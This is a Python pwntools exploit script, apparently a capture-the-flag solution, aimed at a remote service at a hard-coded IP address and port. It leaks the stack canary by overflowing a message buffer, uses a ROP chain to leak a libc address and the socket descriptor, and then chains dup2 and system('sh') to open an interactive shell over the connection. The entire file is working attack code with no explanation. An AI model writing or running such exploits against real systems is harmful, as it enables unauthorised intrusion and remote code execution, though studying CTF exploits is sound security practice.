#!/usr/bin/env python
from pwn import *

r = remote('110.10.212.130', 8889)
#r = remote('127.0.0.1', 8181)
libc = ELF('libc-2.19_16.so')

read_input = 0x08048907
write_output = 0x080488b1
fd_addr = 0x0804B1B8
send_plt = 0x08048700
send_got = 0x804b064
send_off = libc.symbols['send']
system_plt = 0x08048620
pop_ebx_ret = 0x08048589
dup2_off = libc.symbols['dup2']
menu = 0x8048a71
pop_edi_ebp_ret = 0x08048b84

# leak canary
r.sendlineafter('Select menu > ', str(1))
r.sendafter('Input Your Message : ', 'A'*40+'B')
r.recvuntil('A'*40+'B')
canary = u32('\x00'+r.recvn(3))
print 'canary is: ', hex(canary)

# leak send@got.plt address and fd stored on .bss
r.sendlineafter('Select menu > ', str(1))
r.sendafter('Input Your Message : ',
            'A'*40 + p32(canary) + 'B'*12 +
            p32(write_output) + p32(pop_ebx_ret) + p32(send_got) +
            p32(write_output) + p32(menu) + p32(fd_addr)
           )

# select "3. Exit" to make this function return to run ROP chain
r.sendlineafter('Select menu > ', str(3))

base = u32(r.recv()[0:4]) - send_off
print 'libc base: ', hex(base)
dup2 = base + dup2_off
sh = base + next(libc.search('sh\x00'))

fd = int(enhex(r.recvn(1)), 16)
print 'fd: ', hex(fd)

r.sendlineafter('Select menu > ', str(1))
r.sendafter('Input Your Message : ',
            'A'*40 + p32(canary) + 'B'*12 +
            p32(dup2) + p32(pop_edi_ebp_ret) + p32(fd) + p32(0) +
            p32(dup2) + p32(pop_edi_ebp_ret) + p32(fd) + p32(1) +
            p32(system_plt) + p32(0xdeadbeef) + p32(sh)
           )

r.sendlineafter('Select menu > ', str(3))

r.interactive()
